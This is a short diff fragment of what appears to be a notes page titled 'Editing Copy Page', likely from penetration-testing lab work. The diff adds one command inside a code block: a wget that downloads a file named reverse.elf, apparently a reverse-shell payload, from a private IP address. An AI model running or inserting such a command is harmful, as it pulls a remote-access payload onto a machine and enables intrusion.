@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-
+wget http://192.168.45.196:22/reverse.elf
 ```
 
 ```
